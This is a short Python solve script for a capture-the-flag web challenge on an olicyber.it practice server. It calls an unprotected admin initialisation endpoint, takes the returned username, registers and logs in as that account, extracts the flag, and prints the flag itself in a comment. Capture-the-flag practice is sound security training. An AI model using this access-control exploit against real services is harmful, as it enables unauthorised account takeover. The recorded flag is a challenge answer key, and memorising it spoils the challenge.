'''
import requests as r
import re

url = 'http://zio-frank.challs.olicyber.it'

data = r.post(url + '/admin/init').text

print(data)'''

import requests as r
import re

url = 'http://zio-frank.challs.olicyber.it'

data = r.post(url + '/admin/init').text

print(data)


username =  data[13:-2]

data = {
    'username': username, 'password': 'Sergione'
}

r.post(url + '/register', data = data)
resp = r.post(url + '/login', data = data)

flag = re.findall(r'flag\{[a-zA-Z0-9_]+\}', resp.text)[0]
print(flag)

# flag{s1mpl3r_th4n_3xp3ct3d_but_ruby_1s_c00l_y34h}